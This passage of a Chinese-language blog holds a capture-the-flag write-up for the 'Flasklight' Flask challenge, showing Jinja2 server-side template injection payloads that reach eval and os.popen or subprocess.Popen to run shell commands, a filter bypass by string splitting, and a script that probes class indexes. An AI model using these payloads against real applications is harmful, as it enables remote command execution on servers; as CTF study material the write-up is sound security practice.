&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() &#125;&#125;
&#123;% endif %&#125;
&#123;% endfor %&#125;

#  官方exp
&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;
  &#123;% for b in c.__init__.__globals__.values() %&#125;
  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;
    &#123;% if &#39;eval&#39; in b.keys() %&#125;
      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;
    &#123;% endif %&#125;
  &#123;% endif %&#125;
  &#123;% endfor %&#125;
&#123;% endif %&#125;
&#123;% endfor %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="查询类位置的脚本"><a href="#查询类位置的脚本" class="headerlink" title="查询类位置的脚本"></a>查询类位置的脚本</h3><pre class="line-numbers language-none"><code class="language-none">#查询需要的类在第几位
#输入查询出来类的列表和需要借助的类名称
def find():
    list &#x3D; &quot;&quot; # 根据&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;的结果修改
    list &#x3D; list.replace(&#39;\&#39;&#39;,&#39;&#39;)
    list &#x3D; list.replace(&#39;&lt;&#39;,&#39;&#39;)
    list &#x3D; list.replace(&#39;&gt;&#39;,&#39;&#39;)
    list &#x3D; list.replace(&#39;class &#39;,&#39;&#39;)
    list &#x3D; list.replace(&#39;enum &#39;,&#39;&#39;)
    list &#x3D; list.replace(&#39;type &#39;,&#39;&#39;)
    list &#x3D; list.split(&#39;,&#39;)

    print(list)
    className &#x3D; &#39; warnings.catch_warnings&#39; # 需要查询的类名
    num &#x3D; list.index(className)
    print(num)



if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    find()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="wp-1"><a href="#wp-1" class="headerlink" title="wp(1)"></a>wp(1)</h2><p>打开题目环境后查看页面源代码</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Flasklight&lt;&#x2F;title&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;
  &lt;marquee&gt;&lt;h1&gt;Flasklight&lt;&#x2F;h1&gt;&lt;&#x2F;marquee&gt;
  &lt;h2&gt;You searched for:&lt;&#x2F;h2&gt;
  &lt;h3&gt;None&lt;&#x2F;h3&gt;
  &lt;br&gt;
  &lt;h2&gt;Here is your result&lt;&#x2F;h2&gt;
  &lt;h3&gt;[&#39;CCC&#123;Fl49_p@l5u&#125;&#39;, &#39;CSC CTF 2019&#39;, &#39;Welcome to CTF Bois&#39;, &#39;CCC&#123;Qmu_T3rtyPuuuuuu&#125;&#39;, &#39;Tralala_trilili&#39;]&lt;&#x2F;h3&gt;&lt;br&gt;
  &lt;!-- Parameter Name: search --&gt;
  &lt;!-- Method: GET --&gt;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们尝试一下是否有SSTI漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;6e6337b9-e492-4577-92c1-f3772b27eb2d.node4.buuoj.cn&#x2F;?search&#x3D;&#123;&#123;3*3&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>回显结果出现了9，说明存在漏洞</p>
<p>试着获取所有继承自object的类</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;6e6337b9-e492-4577-92c1-f3772b27eb2d.node4.buuoj.cn&#x2F;?search&#x3D;&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>回显</p>
<pre class="line-numbers language-none"><code class="language-none">[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;type &#39;collections.deque&#39;&gt;, &lt;type &#39;deque_iterator&#39;&gt;, &lt;type &#39;deque_reverse_iterator&#39;&gt;, &lt;type &#39;operator.itemgetter&#39;&gt;, &lt;type &#39;operator.attrgetter&#39;&gt;, &lt;type &#39;operator.methodcaller&#39;&gt;, &lt;type &#39;itertools.combinations&#39;&gt;, &lt;type &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;type &#39;itertools.cycle&#39;&gt;, &lt;type &#39;itertools.dropwhile&#39;&gt;, &lt;type &#39;itertools.takewhile&#39;&gt;, &lt;type &#39;itertools.islice&#39;&gt;, &lt;type &#39;itertools.starmap&#39;&gt;, &lt;type &#39;itertools.imap&#39;&gt;, &lt;type &#39;itertools.chain&#39;&gt;, &lt;type &#39;itertools.compress&#39;&gt;, &lt;type &#39;itertools.ifilter&#39;&gt;, &lt;type &#39;itertools.ifilterfalse&#39;&gt;, &lt;type &#39;itertools.count&#39;&gt;, &lt;type &#39;itertools.izip&#39;&gt;, &lt;type &#39;itertools.izip_longest&#39;&gt;, &lt;type &#39;itertools.permutations&#39;&gt;, &lt;type &#39;itertools.product&#39;&gt;, &lt;type &#39;itertools.repeat&#39;&gt;, &lt;type &#39;itertools.groupby&#39;&gt;, &lt;type &#39;itertools.tee_dataobject&#39;&gt;, &lt;type &#39;itertools.tee&#39;&gt;, &lt;type &#39;itertools._grouper&#39;&gt;, &lt;type &#39;_thread._localdummy&#39;&gt;, &lt;type &#39;thread._local&#39;&gt;, &lt;type &#39;thread.lock&#39;&gt;, &lt;type &#39;method_descriptor&#39;&gt;, &lt;class &#39;markupsafe._MarkupEscapeHelper&#39;&gt;, &lt;type &#39;_io._IOBase&#39;&gt;, &lt;type &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;type &#39;_hashlib.HASH&#39;&gt;, &lt;type &#39;_random.Random&#39;&gt;, &lt;type &#39;cStringIO.StringO&#39;&gt;, &lt;type &#39;cStringIO.StringI&#39;&gt;, &lt;type &#39;cPickle.Unpickler&#39;&gt;, &lt;type &#39;cPickle.Pickler&#39;&gt;, &lt;type &#39;functools.partial&#39;&gt;, &lt;type &#39;_ssl._SSLContext&#39;&gt;, &lt;type &#39;_ssl._SSLSocket&#39;&gt;, &lt;class &#39;socket._closedsocket&#39;&gt;, &lt;type &#39;_socket.socket&#39;&gt;, &lt;class &#39;socket._socketobject&#39;&gt;, &lt;class &#39;socket._fileobject&#39;&gt;, &lt;type &#39;time.struct_time&#39;&gt;, &lt;type &#39;Struct&#39;&gt;, &lt;class &#39;urlparse.ResultMixin&#39;&gt;, &lt;class &#39;contextlib.GeneratorContextManager&#39;&gt;, &lt;class &#39;contextlib.closing&#39;&gt;, &lt;type &#39;_json.Scanner&#39;&gt;, &lt;type &#39;_json.Encoder&#39;&gt;, &lt;class &#39;json.decoder.JSONDecoder&#39;&gt;, &lt;class &#39;json.encoder.JSONEncoder&#39;&gt;, &lt;class &#39;threading._Verbose&#39;&gt;, &lt;class &#39;jinja2.utils.MissingType&#39;&gt;, &lt;class &#39;jinja2.utils.LRUCache&#39;&gt;, &lt;class &#39;jinja2.utils.Cycler&#39;&gt;, &lt;class &#39;jinja2.utils.Joiner&#39;&gt;, &lt;class &#39;jinja2.utils.Namespace&#39;&gt;, &lt;class &#39;jinja2.bccache.Bucket&#39;&gt;, &lt;class &#39;jinja2.bccache.BytecodeCache&#39;&gt;, &lt;class &#39;jinja2.nodes.EvalContext&#39;&gt;, &lt;class &#39;jinja2.visitor.NodeVisitor&#39;&gt;, &lt;class &#39;jinja2.nodes.Node&#39;&gt;, &lt;class &#39;jinja2.idtracking.Symbols&#39;&gt;, &lt;class &#39;jinja2.compiler.MacroRef&#39;&gt;, &lt;class &#39;jinja2.compiler.Frame&#39;&gt;, &lt;class &#39;jinja2.runtime.TemplateReference&#39;&gt;, &lt;class &#39;numbers.Number&#39;&gt;, &lt;class &#39;jinja2.runtime.Context&#39;&gt;, &lt;class &#39;jinja2.runtime.BlockReference&#39;&gt;, &lt;class &#39;jinja2.runtime.Macro&#39;&gt;, &lt;class &#39;jinja2.runtime.Undefined&#39;&gt;, &lt;class &#39;decimal.Decimal&#39;&gt;, &lt;class &#39;decimal._ContextManager&#39;&gt;, &lt;class &#39;decimal.Context&#39;&gt;, &lt;class &#39;decimal._WorkRep&#39;&gt;, &lt;class &#39;decimal._Log10Memoize&#39;&gt;, &lt;type &#39;_ast.AST&#39;&gt;, &lt;class &#39;ast.NodeVisitor&#39;&gt;, &lt;class &#39;jinja2.lexer.Failure&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStreamIterator&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStream&#39;&gt;, &lt;class &#39;jinja2.lexer.Lexer&#39;&gt;, &lt;class &#39;jinja2.parser.Parser&#39;&gt;, &lt;class &#39;jinja2.environment.Environment&#39;&gt;, &lt;class &#39;jinja2.environment.Template&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateModule&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateExpression&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateStream&#39;&gt;, &lt;class &#39;jinja2.loaders.BaseLoader&#39;&gt;, &lt;type &#39;datetime.date&#39;&gt;, &lt;type &#39;datetime.timedelta&#39;&gt;, &lt;type &#39;datetime.time&#39;&gt;, &lt;type &#39;datetime.tzinfo&#39;&gt;, &lt;class &#39;logging.LogRecord&#39;&gt;, &lt;class &#39;logging.Formatter&#39;&gt;, &lt;class &#39;logging.BufferingFormatter&#39;&gt;, &lt;class &#39;logging.Filter&#39;&gt;, &lt;class &#39;logging.Filterer&#39;&gt;, &lt;class &#39;logging.PlaceHolder&#39;&gt;, &lt;class &#39;logging.Manager&#39;&gt;, &lt;class &#39;logging.LoggerAdapter&#39;&gt;, &lt;class &#39;werkzeug._internal._Missing&#39;&gt;, &lt;class &#39;werkzeug._internal._DictAccessorProperty&#39;&gt;, &lt;class &#39;werkzeug.utils.HTMLBuilder&#39;&gt;, &lt;class &#39;werkzeug.exceptions.Aborter&#39;&gt;, &lt;class &#39;werkzeug.urls.Href&#39;&gt;, &lt;type &#39;select.epoll&#39;&gt;, &lt;class &#39;click._compat._FixupStream&#39;&gt;, &lt;class &#39;click._compat._AtomicFile&#39;&gt;, &lt;class &#39;click.utils.LazyFile&#39;&gt;, &lt;class &#39;click.utils.KeepOpenFile&#39;&gt;, &lt;class &#39;click.utils.PacifyFlushWrapper&#39;&gt;, &lt;class &#39;click.parser.Option&#39;&gt;, &lt;class &#39;click.parser.Argument&#39;&gt;, &lt;class &#39;click.parser.ParsingState&#39;&gt;, &lt;class &#39;click.parser.OptionParser&#39;&gt;, &lt;class &#39;click.types.ParamType&#39;&gt;, &lt;class &#39;click.formatting.HelpFormatter&#39;&gt;, &lt;class &#39;click.core.Context&#39;&gt;, &lt;class &#39;click.core.BaseCommand&#39;&gt;, &lt;class &#39;click.core.Parameter&#39;&gt;, &lt;class &#39;werkzeug.serving.WSGIRequestHandler&#39;&gt;, &lt;class &#39;werkzeug.serving._SSLContext&#39;&gt;, &lt;class &#39;werkzeug.serving.BaseWSGIServer&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableListMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.UpdateDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ViewItems&#39;&gt;, &lt;class &#39;werkzeug.datastructures._omd_bucket&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Headers&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableHeadersMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.IfRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Range&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ContentRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.FileStorage&#39;&gt;, &lt;class &#39;email.LazyImporter&#39;&gt;, &lt;class &#39;calendar.Calendar&#39;&gt;, &lt;class &#39;werkzeug.wrappers.accept.AcceptMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.AuthorizationMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.WWWAuthenticateMixin&#39;&gt;, &lt;class &#39;werkzeug.wsgi.ClosingIterator&#39;&gt;, &lt;class &#39;werkzeug.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;werkzeug.wsgi._RangeWrapper&#39;&gt;, &lt;class &#39;werkzeug.formparser.FormDataParser&#39;&gt;, &lt;class &#39;werkzeug.formparser.MultiPartParser&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base_request.BaseRequest&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base_response.BaseResponse&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagRequestMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagResponseMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.cors.CORSRequestMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.cors.CORSResponseMixin&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgentParser&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgent&#39;&gt;, &lt;class &#39;werkzeug.wrappers.user_agent.UserAgentMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.request.StreamOnlyMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStream&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStreamMixin&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieHeaders&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieResponse&#39;&gt;, &lt;class &#39;werkzeug.test.EnvironBuilder&#39;&gt;, &lt;class &#39;werkzeug.test.Client&#39;&gt;, &lt;class &#39;uuid.UUID&#39;&gt;, &lt;type &#39;CArgObject&#39;&gt;, &lt;type &#39;_ctypes.CThunkObject&#39;&gt;, &lt;type &#39;_ctypes._CData&#39;&gt;, &lt;type &#39;_ctypes.CField&#39;&gt;, &lt;type &#39;_ctypes.DictRemover&#39;&gt;, &lt;class &#39;ctypes.CDLL&#39;&gt;, &lt;class &#39;ctypes.LibraryLoader&#39;&gt;, &lt;class &#39;subprocess.Popen&#39;&gt;, &lt;class &#39;itsdangerous._json._CompactJSON&#39;&gt;, &lt;class &#39;itsdangerous.signer.SigningAlgorithm&#39;&gt;, &lt;class &#39;itsdangerous.signer.Signer&#39;&gt;, &lt;class &#39;itsdangerous.serializer.Serializer&#39;&gt;, &lt;class &#39;itsdangerous.url_safe.URLSafeSerializerMixin&#39;&gt;, &lt;class &#39;flask._compat._DeprecatedBool&#39;&gt;, &lt;class &#39;werkzeug.local.Local&#39;&gt;, &lt;class &#39;werkzeug.local.LocalStack&#39;&gt;, &lt;class &#39;werkzeug.local.LocalManager&#39;&gt;, &lt;class &#39;werkzeug.local.LocalProxy&#39;&gt;, &lt;class &#39;difflib.HtmlDiff&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleFactory&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleTemplate&#39;&gt;, &lt;class &#39;werkzeug.routing.BaseConverter&#39;&gt;, &lt;class &#39;werkzeug.routing.Map&#39;&gt;, &lt;class &#39;werkzeug.routing.MapAdapter&#39;&gt;, &lt;class &#39;flask.signals.Namespace&#39;&gt;, &lt;class &#39;flask.signals._FakeSignal&#39;&gt;, &lt;class &#39;flask.helpers.locked_cached_property&#39;&gt;, &lt;class &#39;flask.helpers._PackageBoundObject&#39;&gt;, &lt;class &#39;flask.cli.DispatchingApp&#39;&gt;, &lt;class &#39;flask.cli.ScriptInfo&#39;&gt;, &lt;class &#39;flask.config.ConfigAttribute&#39;&gt;, &lt;class &#39;flask.ctx._AppCtxGlobals&#39;&gt;, &lt;class &#39;flask.ctx.AppContext&#39;&gt;, &lt;class &#39;flask.ctx.RequestContext&#39;&gt;, &lt;class &#39;flask.json.tag.JSONTag&#39;&gt;, &lt;class &#39;flask.json.tag.TaggedJSONSerializer&#39;&gt;, &lt;class &#39;flask.sessions.SessionInterface&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json._JSONModule&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json.JSONMixin&#39;&gt;, &lt;class &#39;flask.blueprints.BlueprintSetupState&#39;&gt;, &lt;type &#39;unicodedata.UCD&#39;&gt;, &lt;class &#39;jinja2.ext.Extension&#39;&gt;, &lt;class &#39;jinja2.ext._CommentFinder&#39;&gt;, &lt;type &#39;array.array&#39;&gt;, &lt;type &#39;method-wrapper&#39;&gt;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>用脚本可以查询到<strong>warnings.catch_warnings</strong>在59位</p>
<p>构造payload</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>解释：</p>
<pre class="line-numbers language-none"><code class="language-none">[].__class__.__base__.__subclasses__()[59] # warnings.catch_warnings模块[&#39;__globals__&#39;] # 看到全局（本模块）可读的量[&#39;__builtins__&#39;] # 导入内建函数[&#39;eval&#39;] # 将字符串作为命令执行(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) # 输出当前目录下的所有文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里我们发现页面提示500，可能是过滤了关键字，字符串拼接试一下</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls &#x2F;flasklight&#39;).read()&quot;)&#125;&#125;&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>拿到flag</p>
<h2 id="wp-2"><a href="#wp-2" class="headerlink" title="wp(2)"></a>wp(2)</h2><p>记录一个大佬的wp，他使用了<code>subprocess.Popen()</code>模块</p>
<blockquote>
<p>从python2.4版本开始,可以用subprocess这个模块来产生子进程,并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。<br>subprocess意在替代其他几个老的模块或者函数，比如：os.system os.spawn* os.popen* popen2.* commands.*</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">import requestsimport reimport htmlimport timeindex &#x3D; 0for i in range(170, 1000):    try:        url &#x3D; &quot;http:&#x2F;&#x2F;17ad255a-204e-4624-b878-e3e0d62e526a.node3.buuoj.cn&#x2F;?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[&quot; + str(i) + &quot;]&#125;&#125;&quot;        r &#x3D; requests.get(url)        res &#x3D; re.findall(&quot;&lt;h2&gt;You searched for:&lt;\&#x2F;h2&gt;\W+&lt;h3&gt;(.*)&lt;\&#x2F;h3&gt;&quot;, r.text)        time.sleep(0.1)        # print(res)        # print(r.text)        res &#x3D; html.unescape(res[0])        print(str(i) + &quot; | &quot; + res)        if &quot;subprocess.Popen&quot; in res:            index &#x3D; i            break    except:        continueprint(&quot;indexo of subprocess.Popen:&quot; + str(index))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>有空再研究一下这个</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>





<blockquote>
<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ersuani/p/13896311.html">https://www.cnblogs.com/ersuani/p/13896311.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/107589811">https://blog.csdn.net/mochu7777777/article/details/107589811</a></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://tianliuyun.github.io/2021/08/03/%E8%B5%B7%E7%82%B9/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Derait">
      <meta itemprop="description" content="花有重开日，人无再少年">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="花与剑">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/03/%E8%B5%B7%E7%82%B9/" class="post-title-link" itemprop="url">起点</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-03 00:25:00 / 修改时间：00:25:59" itemprop="dateCreated datePublished" datetime="2021-08-03T00:25:00+08:00">2021-08-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9A%8F%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">随记</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>希望从今天起，我的每一天都过得有意义</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Derait</p>
  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">7</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="link fa-fw"></i>
      友链
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="http://xcy1010.cn/" title="http:&#x2F;&#x2F;xcy1010.cn&#x2F;" rel="noopener" target="_blank">xcy1010</a>
        </li>
